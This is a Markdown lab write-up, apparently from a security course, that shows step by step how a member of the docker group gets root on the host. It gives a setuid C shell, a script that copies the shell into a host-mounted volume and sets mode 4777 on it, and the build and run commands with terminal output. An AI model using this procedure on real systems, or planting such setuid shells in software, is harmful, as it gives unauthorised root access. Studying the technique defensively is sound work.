# Attack 1: Privilege escalation using Volume Mount

Note:

- The Docker daemon is a background process responsible for managing Docker containers and interacting with the host operating system.
- Docker Daemon requires root privileges to perform some of its operations, So it runs with root privileges.
- If a user is part of docker group, it is possible to elevate his/her privileges to root.
- We are going to use docker volumes and setuid binaries to achieve this.
- We can mount the volume of the host into a container for persistent storage using docker volumes.
- When a binary is created by a root user and the setuid bit is set on it.  It will run as root even when a low privilege user executes it.

## Requirements:

1. The user should be part of the docker group

```bash
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer),143(vboxsf)
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ id | grep "docker"                         
```

1. If not make the user the part of the docker group

```bash

┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ sudo usermod -aG docker kali      
[sudo] password for kali: 
                               
# Reboot
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ sudo reboot    
[sudo] password for kali: 

# Run the following to confirm that the user is in the docker group

┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ id | grep "docker"     
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer),143(vboxsf),145(docker)
         
```

## Steps:

### 1. Docker File

A Dockerfile is a text file containing instructions for building a Docker container image, specifying the environment, dependencies, and commands needed to create a reproducible environment for running an application.

```bash
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ cat Dockerfile
FROM alpine:latest
COPY shellscript.sh shellscript.sh
COPY shell shell
                       
```

The Dockerfile  is instructing Docker to create a Docker container image based on the Alpine Linux distribution. It then copies two files, `shellscript.sh` and `shell`, into the root directory of the container.

Here's what each line does:

1. `FROM alpine:latest`: This line specifies the base image for the Docker container. It instructs Docker to use the latest version of Alpine Linux as the starting point for building the container.
2. `COPY shellscript.sh shellscript.sh`: This line copies the file `shellscript.sh` from the current directory on your local machine (where the Dockerfile is located) into the root directory of the container. The syntax is `COPY <source> <destination>`, so in this case, it's copying `shellscript.sh` from the local directory to the same location within the container.
3. `COPY shell shell`: This line copies the file `shell` from the current directory on your local machine into the root directory of the container. Similar to the previous line, it's copying `shell` from the local directory to the same location within the container.

Overall, this Dockerfile sets up a basic Alpine Linux-based container and adds two files (`shellscript.sh` and `shell`) to its root directory. 

### 2. Shell.c

```bash
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ cat shell.c    
#include <unistd.h> // For setuid()
#include <stdlib.h> // For system()

int main()
{
        setuid(0);
        system("/bin/sh");
        return 0;
}         
```

The C program **`shell.c`** is designed to escalate privileges by running **`/bin/sh`** with root permissions. Here's a brief explanation of what it does:

1. **`#include <unistd.h>`** and **`#include <stdlib.h>`**: These are header files that provide declarations and definitions for functions used in the program.
2. **`setuid(0);`**: This function call sets the effective user ID (EUID) of the process to 0, which is the user ID of the root user. This effectively escalates privileges, allowing the subsequent **`system()`** call to execute commands with root privileges.
3. **`system("/bin/sh");`**: This line uses the **`system()`** function to execute the command **`/bin/sh`**, which starts a new shell. Since the effective user ID has been set to 0 (root) in the previous step, the shell that is spawned will have root privileges, effectively providing a root shell to the user.
4. **`return 0;`**: This line is the end of the **`main()`** function and indicates successful completion of the program.

### 3.  shellscript.sh

```bash
**┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ cat shellscript.sh     
#!/bin/bash

cp shell /shared/shell
chmod 4777 /shared/shell**

```

The shell script **`shellscript.sh`** performs the following actions:

1. **`#!/bin/bash`**: This line is called a "shebang" and indicates that the script should be executed using the Bash shell.
2. **`cp shell /shared/shell`**: This command copies the file named **`shell`** (presumably the compiled executable from the **`shell.c`** program) to the **`/shared`** directory with the name **`shell`**. The **`/shared`** directory is likely shared with other containers or the host system, making the **`shell`** executable accessible outside the container.
3. **`chmod 4777 /shared/shell`**: This command sets the permissions of the **`/shared/shell`** executable to **`4777`**. Breaking down the permissions:
    - The first digit (**`4`**) indicates the setuid bit is set. This means that the executable will run with the permissions of the file owner (root in this case) when executed.
    - The following digits (**`777`**) grant full read, write, and execute permissions to the owner, group, and others, respectively. This ensures that anyone can execute the **`shell`** executable and gain root privileges when it runs due to the setuid bit.

Once we build the image and once we start the container, we are going to get the new binary to the shared volume , we can grab that and we can execute it to get root privileges.

### 4. Build the Docker Image:

```bash
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ docker build --rm -t privilege_escalation .
Sending build context to Docker daemon  20.99kB
Step 1/3 : FROM alpine:latest
latest: Pulling from library/alpine
4abcf2066143: Pull complete 
Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b
Status: Downloaded newer image for alpine:latest
 ---> 05455a08881e
Step 2/3 : COPY shellscript.sh shellscript.sh
 ---> 99f5c218f711
Step 3/3 : COPY shell shell
 ---> 6f19f0fcc49b
Successfully built 6f19f0fcc49b
Successfully tagged privilege_escalation:latest
```

- **`docker build`**: This command tells Docker to build an image based on the instructions specified in the Dockerfile located in the current directory.
- **`-rm`**: This option instructs Docker to remove intermediate containers created during the build process. This helps to keep the system clean by removing unnecessary containers after the build is complete.
- **`t privilege_escalation`**: This option tags the resulting image with the name **`privilege_escalation`**. Tags are used to identify and reference Docker images.
- **`.`**: This period specifies the build context, which is the current directory (**`./`**). Docker looks for the Dockerfile and any other necessary files in this directory to build the image.

### 5. Start the Container:

```bash
┌──(kali㉿kali)-[~/Desktop/INSE 6130/privilege escalation]
└─$ docker run -v /tmp/:/shared/ privilege_escalation:latest /bin/sh shellscript.sh
```

This **`docker run`** command executes a Docker container based on the **`privilege_escalation:latest`** image. Let's break down the command:

- **`docker run`**: This command is used to create and start a new Docker container.
- **`v /tmp/:/shared/`**: This flag mounts the local directory **`/tmp/`** to the **`/shared/`** directory inside the Docker container. This means that files in **`/tmp/`** on the host system will be accessible from within the container at **`/shared/`**.
- **`privilege_escalation:latest`**: This specifies the name and tag of the Docker image to use for creating the container. In this case, it's using the **`privilege_escalation`** image with the **`latest`** tag.
- **`/bin/sh shellscript.sh`**: This specifies the command to run inside the container. It runs the shell script **`shellscript.sh`** using **`/bin/sh`** as the interpreter.

![Untitled](Attack%201%20Privilege%20escalation%20using%20Volume%20Mount%20b75bb92065c5405db71e4025d4132e05/Untitled.png)

- The shell file is created in /tmp with setuid bit set.

### 6. Running the script created in /tmp through the docker container

- Before executing the script

![Untitled](Attack%201%20Privilege%20escalation%20using%20Volume%20Mount%20b75bb92065c5405db71e4025d4132e05/Untitled%201.png)

- Executing the script.

![Untitled](Attack%201%20Privilege%20escalation%20using%20Volume%20Mount%20b75bb92065c5405db71e4025d4132e05/Untitled%202.png)

![Untitled](Attack%201%20Privilege%20escalation%20using%20Volume%20Mount%20b75bb92065c5405db71e4025d4132e05/Untitled%203.png)

### Reference:

[Root your Docker host in 10 seconds for fun and profit | Electricmonk.nl weblog](https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/)